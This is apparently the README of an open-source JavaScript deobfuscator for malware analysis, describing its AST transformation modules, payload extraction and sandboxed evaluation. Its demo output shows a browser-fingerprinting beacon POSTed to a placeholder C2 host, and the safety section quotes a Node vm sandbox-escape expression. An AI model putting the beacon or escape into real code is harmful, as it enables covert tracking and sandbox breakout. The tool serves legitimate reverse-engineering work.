<p align="center">
  <img src="assets/banner.png" alt="untangle" width="100%">
</p>

<p align="center">
  <a href="https://github.com/CtxtArc/untangle/actions"><img src="https://github.com/CtxtArc/untangle/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT">
</p>

A JavaScript deobfuscator for malware reversing, built the way
[restringer](https://github.com/HumanSecurity/restringer) is: parse to an AST, run small
targeted transformation modules until the code stops changing, and evaluate the parts
that can only be resolved by running them inside a sandbox.

```
$ untangle --dyn samples/obfuscated.js
function collect() {
  const _0x7a1b = {
    ua: navigator.userAgent,
    lang: navigator.language,
    id: getId()
  };
  return JSON.stringify(_0x7a1b);
}
function getId() {
  var _0x9f8e = localStorage.getItem('uid');
  if (!_0x9f8e) {
    _0x9f8e = Math.random().toString(36).substring(2);
    localStorage.setItem('uid', _0x9f8e);
  }
  return _0x9f8e;
}
fetch('https://c2.example.invalid/beacon', { method: 'POST', body: collect() })...
```

The input is ~100 lines of obfuscator.io-style output: a rotated base64 string array, a
self-redefining decoder with cache, wrapper functions, proxy objects, control-flow
flattening and dead-code injection. The output behaves the same as the input; the test
suite checks this by running both.

## Install / run

Requires Node.js 22 or newer.

```sh
git clone https://github.com/CtxtArc/untangle && cd untangle
npm install
npm test

./bin/untangle.js sample.js -o clean.js --stats     # static only: nothing from the sample runs
./bin/untangle.js --dyn sample.js -o clean.js       # also evaluate decoders/loops in the sandbox (isolated VM!)
./bin/untangle.js dropper.js --extract-blobs blobs  # also pull embedded payloads out to files
cat sample.js | ./bin/untangle.js -
```

or install the CLI globally: `npm install -g github:CtxtArc/untangle`.

As a library:

```js
import { deobfuscate } from 'untangle';
const { code, stats, pending } = deobfuscate(src);                 // static only
const full = deobfuscate(src, { dynamic: true });                  // + sandboxed evaluation
```

Payload extraction from code: `import { extractBlobs } from 'untangle/blobs'`.

`pending` lists, per sandboxed module, how many evaluations static mode skipped.

Options: `dynamic` (default `false`), `maxIterations`, `removeDeadCode`, `keepGlobals`,
`disable: ['moduleName']`, `verbose`, `sandbox: { timeout, preludeTimeout, checkSideEffects }`.

## Modules

`untangle --list-modules` lists them. Static modules run to a fixpoint. With `--dyn`, the
sandboxed modules then run once and the cycle repeats while anything changes; without it they
only report what they would have evaluated.

| module | does |
|---|---|
| `foldConstants` | `!![]`, `0x1f + 1`, `'a' + 'b'`, `typeof 'x'`, `void 0`, template literals |
| `normalizeComputed` | `a['b']` → `a.b`, `{'k': 1}` → `{k: 1}` (keeps `__proto__` / `constructor` semantics) |
| `simplifyBranches` | static `if` / `?:` / `&&` / `\|\|` / `??` / `while(false)`, keeping hoisted `var`s |
| `splitSequences` | `a(), b()` → `a(); b();`, `return a(), b` → `a(); return b`, `var a, b` → two decls |
| `splitRedeclarations` | `var s = 'a'; use(s); var s = 'b'; use(s)` and `s = s.split('#').join('')` → `s` / `s_1`, when the definitions are straight-line |
| `inlineConstants` | `var s = 'x'; f(s)` → `f('x')` (single def, never reassigned, not read before its declaration) |
| `resolveMemberAccess` | `['a','b'][1]`, `'abc'.length`, and constant arrays that never escape or mutate |
| `inlineProxyVariables` | `var b = a; b()` → `a()` when `a` resolves to the same binding at every use |
| `resolveProxyObjects` | obfuscator.io proxy objects: `o.aBc(x, y)` → `x + y`, `o.k` → `'log'` |
| `inlineProxyFunctions` | single-`return` wrappers: `w('k', 0x20)` → `dec(0x20 - 0x1a, 'k')` |
| `unflattenControlFlow` | `'2\|0\|1'.split('\|')` + `while(true) switch(o[i++])` dispatchers → straight-line code |
| `unwrapEval` | `eval('code')` → code, `Function('code')()` → IIFE (only when no local would be captured) |
| `foldBuiltinCalls` | static: `'dlrow'.split('').reverse().join('')`, `blob.split('♉').join('')`, `String.fromCharCode(…)`, `atob`, `parseInt`, … on literal data, via a whitelist interpreter (no regex arguments, no callbacks, size caps) |
| `splitJoinConcat` ⚠ | `(folder + '\\♉♉ev♉♉il.exe').split('♉♉').join('')` → `folder + '\\evil.exe'` |
| `removeUnreachable` | statements after `return` / `throw` / `break` / `continue` / `WScript.Quit()` |
| `removeDeadCode` | unused bindings, even when declared many times, plus statements that only write to them (`junk += '…'`, `obj[k] = {…}`, `x.k++`), and never-read `this.NAME = …` globals; all-or-nothing |
| `cleanup` | empty statements, no-op expressions, nested blocks |
| `resolveBuiltinCalls` 🔒 | what `foldBuiltinCalls` refuses (e.g. regex arguments), in the sandbox; follows constant variables, so a 12-step `a.split('?').join('')` chain resolves in one evaluation |
| `resolveConstantLoops` 🔒 | `var out = ''; for (…) out += String.fromCharCode(parseInt(blob.substr(i, 2), 16) ^ key.charCodeAt(…))` → `var out = '<decoded>'` |
| `resolveEvalArguments` 🔒 | `eval(function(p,a,c,k,e,d){...}(...))` (Dean Edwards packer), `eval(atob(...))` |
| `resolveDecoderCalls` 🔒 | string-array decoders: evaluates calls with literal arguments together with their context |

🔒 = evaluates code from the sample inside the sandbox; only with `--dyn`. ⚠ = heuristic: exact only if the runtime
part of the concatenation never contains a separator character; it only fires for separators
without letters or digits that actually occur in the literals. `--disable splitJoinConcat` turns it off.

## Embedded payloads

Droppers carry their payloads as multi-megabyte string literals. `--extract-blobs <dir>` moves
every string literal of at least `--blob-min` characters (default 2048) into a file, decodes
base64, identifies the result (PE with arch / EXE vs DLL / timestamp, ELF, ZIP, gzip, PDF, Lua
and LuaJIT bytecode, text) and replaces the literal in the output with a placeholder carrying its
SHA-256. `manifest.json` lists everything. Nothing extracted is executed.

```
$ untangle --dyn dropper.js --extract-blobs blobs -o clean.js
blob 1: PE x64 EXE, timestamp 2025-01-01, 31800 bytes, sha256 <64 hex> -> blob1_<sha12>.bin
blob 2: text, 1173848 bytes, sha256 <64 hex> -> blob2_<sha12>.txt
...
```

### How decoder resolution works

For each function called with literal-only arguments, `resolveDecoderCalls` collects its
**context**: its declaration, the declarations of every binding it references (transitively),
`name = function () {}` reassignments, and IIFEs that receive one of those bindings as an
argument (the string-array rotators). The context runs once as a prelude in a fresh
sandbox, then every call is evaluated **twice**. A result is accepted only if:

- it is a string, number or boolean,
- both evaluations return the same value (`Math.random` and `Date` throw in the sandbox),
- neither evaluation changes global state, apart from a global function being replaced by
  another function (self-redefining decoders).

When every call to a decoder is resolved and nothing else uses its context, the decoder,
its string array and its rotator are removed.

## Safety model

Every transform is written to preserve behaviour. Bindings are tracked with eslint-scope,
so shadowing, reassignment, hoisting/TDZ, argument evaluation order, recursion, strict mode,
and `__proto__`/`constructor` keys are all checked before anything is rewritten. When a
module produces code that does not parse, it is reverted and disabled for the rest of the run.

**Static by default:** without `--dyn` nothing from the input is executed; untangle only parses,
rewrites and folds literal data with a whitelist interpreter.

**Sandbox (`--dyn`):** evaluation happens in a separate `node` process started with the permission
model (`--permission`: no filesystem writes, no child processes, workers or addons), an
empty environment and a memory cap. Inside that process the code runs in a `vm` context
whose global is a null-prototype object, so the classic
`this.constructor.constructor('return process')()` escape finds nothing. Every evaluation
has a timeout.

**This is defense in depth, not a security boundary.** Node's permission model does not
restrict network access, and `vm` is not designed to contain hostile code. Run untangle
with `--dyn` on live samples only inside a disposable analysis VM.

## Known limits / next steps

- Proxy objects built by later assignment (`o = {}; o.k = ...`) are not resolved yet, only literals.
- obfuscator.io `selfDefending` / `debugProtection` code can hang the prelude: it times out and
  that decoder is skipped. Use `--disable` or strip the guard first.
- Decoders that keep a cache in a global plain object are rejected by the side-effect check:
  use `--no-side-effect-check` when you have checked the decoder by hand.
- No identifier renaming yet (`_0x9f8e` → `id`), and no JSFuck / AAEncode-specific modules.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the architecture and how to write a module, and
[SECURITY.md](SECURITY.md) for the sandbox threat model and how to report an escape. Please never
attach live samples to issues: a minimal synthetic snippet and a SHA-256 are enough.

## License

[MIT](LICENSE)
